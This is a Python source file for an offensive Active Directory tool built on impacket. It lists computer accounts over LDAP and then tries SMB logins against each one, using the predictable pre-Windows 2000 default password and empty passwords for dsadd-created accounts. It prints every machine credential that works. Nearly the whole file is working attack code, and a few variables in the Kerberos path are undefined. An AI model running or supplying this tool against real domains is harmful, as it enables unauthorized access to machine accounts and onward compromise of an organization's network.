#!/usr/bin/python3
import argparse
from impacket.smbconnection import SMBConnection
from impacket.ldap.ldap import LDAPConnection, LDAPSessionError
from impacket.ldap import ldap, ldapasn1
from impacket.examples.utils import parse_target


def ldapQuery(args):
	domain, username, password, remoteName = parse_target(args.target)

	if args.hashes is not None:
		lmhash, nthash = args.hashes.split(':')
	else:
		lmhash,nthash = '',''

	if(args.target_domain == None):
		kdcHost = domain
	else:
		kdcHost = args.target_domain



	if args.k:
		target = remoteHost
	else:
		if kdcHost is not None:
			target = kdcHost
		else:
			target = domain
	print("[INFO] KDC %s" % kdcHost)

	if (args.target_domain == None):
		print("[DEBUG INFO] No target domain specified - parsing from target string")
		domainParts = domain.split('.')
		baseDN = ''
		for i in domainParts:
			baseDN += 'dc=%s,' % i
	# Remove last ','
		baseDN = baseDN[:-1]
	else:
		print("[DEBUG INFO] Tagret domain specified")
		domainParts = args.target_domain.split('.')
		baseDN = ''
		for i in domainParts:
			baseDN += 'dc=%s,' % i
	# Remove last ','
		baseDN = baseDN[:-1]
	print("[DEBUG INFO] Base DN %s" % baseDN)
	# Template Code for performing an LDAP connection, borrowed from SecretsDump.py
	try:
		ldapConnection = LDAPConnection('ldap://%s' % args.target, baseDN, kdcHost)
		if args.k is not True:
			ldapConnection.login(username, password, domain, lmhash, nthash)
		else:
			ldapConnection.kerberosLogin(username, password, domain, lmhash, nthash, aesKey, kdcHost=kdcHost)
	except LDAPSessionError as e:
		if str(e).find('strongerAuthRequired') >= 0:
		# We need to try SSL
			ldapConnection = LDAPConnection('ldaps://%s' % args.target, baseDN, kdcHost)
			if args.k is not True:
				ldapConnection.login(username, password, domain, lmhash, nthash)
			else:
				ldapConnection.kerberosLogin(username, password, domain, lmhash, nthash, aesKey, kdcHost=kdcHost)
		else:
			print("[-] An error has occured, please verify your credentials are correct")
			raise
	compList = []
	paged_search_control = ldapasn1.SimplePagedResultsControl(criticality=True, size=1000)
	baseLDAPFilter = "(&(objectCategory=computer))"
	if(args.loggedIn == True):
		baseLDAPFilter = "(&(objectCategory=computer)(!userAccountControl:1.2.840.113556.1.4.803:=2)(LogonCount=0))"
	results = ldapConnection.search(searchFilter=baseLDAPFilter,attributes=['sAMAccountName'],searchControls=[paged_search_control])
	try:
		for item in results:
			for attribute in item['attributes']:
				if str(attribute['type']) == 'sAMAccountName':
					sAMAccountName = str(attribute['vals'][0])
					compList.append(sAMAccountName)
	except:
		pass
	compListLen = len(compList)
	print("[+] Successfully Retrieved a list of computers: %s found" % compListLen)
	for comp in compList:
		try:
			if(args.debug == True):
				print("[DEBUG] Trying Pre-Windows 2000 Computer check for %s" % comp)
				trySMBlogin(comp,comp,args)
			else:
				trySMBlogin(comp,comp,args)
		except Exception as e:
			if(args.debug == True):
				print("[DEBUG] Authentication failed for Pre-Windows 2000 check, error: %s" % e)
		try:
			if(args.debug == True):
				print("[DEBUG] Trying dsadd Computer check for %s" % comp)
				trySMBlogin(comp,'',args)
			else:
				trySMBlogin(comp,'',args)
		except:
			if(args.debug == True):
				print("[DEBUG] Authentication failed for dsadd check")




def trySMBlogin(compName, passwd, args):
	domain, username, password, address = parse_target(args.target)
	if(passwd == compName):
		passwd = passwd.lower()
		passwd = passwd.strip('$')
		passwd = passwd[0:14]
	if(args.target_ip == None):
		args.target_ip = address
	if(args.target_domain != None):
		domain = args.target_domain
	else:
		address = address
	try:
		smbConn = SMBConnection(address, args.target_ip, sess_port=445)
		smbConn.login(compName, passwd, domain, '', '')
		if( smbConn and passwd == ''):
				print("[SUCCESS] Machine account created with dsadd Found - Username: %s and no Password." % (compName))

	except Exception as e:
		if("STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT" in str(e)):
			if(passwd == ''):
				print("[SUCCESS] Machine account created with dsadd Found - Username: %s and no Password." % (compName))
			else:
				print("[SUCCESS] Pre-Windows 2000 Machine Account Found - Username: %s Password: %s" % (compName,passwd))
		if(args.debug == True):
			print("Exception: %s" % e)


def tryKerberoslogin(compName, passwd):
	print("Kerberos null")
def tryLDAPlogin(compName, passwd, ldaps):
	print("LDAP null")


def args():
	parser = argparse.ArgumentParser(add_help = True, description = "Machine Account aTtacks. This tool is used to search for Pre-2000 Machine Accounts, or pre-created Machine Accounts with no passwords.")
	parser.add_argument('-dc-ip', action='store',metavar = "ip address",  help='IP Address of the domain controller. If ommited it use the domain part (FQDN) specified in the target parameter')
	parser.add_argument('target', action='store', help='[[domain/]username[:password]@]<targetName or address>')
	parser.add_argument('-target-domain', action='store',metavar='targetdomain', help='The domain you would like to target in case of a domain trust.')
	parser.add_argument('-no-pass', action="store_true", help='don\'t ask for password (useful for -k)')
	parser.add_argument('-protocol', action='store',metavar='protocol', help='(Choices: SMB, LDAP/S) The protocol you would like to use to attempt to test the passwords against.')
	parser.add_argument('-k', action="store_true", help='Use Kerberos authentication. Grabs credentials from ccache file (KRB5CCNAME) based on target parameters. If valid credentials cannot be found, it will use the ones specified in the command line')
	parser.add_argument('-target-ip', action='store', metavar="ip address", help="IP Address of the target machine. If omitted it will use whatever was specified as target. This is useful when target is the NetBIOS name and you cannot resolve it")
	parser.add_argument('-hashes', action="store", metavar = "LMHASH:NTHASH", help='NTLM hashes, format is LMHASH:NTHASH')
	parser.add_argument('-loggedIn', action="store_true", help="Filter on if the user has logged in or not.")
	parser.add_argument('-debug', action="store_true", help="Enable debug mode.")

	args = parser.parse_args()
	
	ldapQuery(args)

def main():
	args()

main()
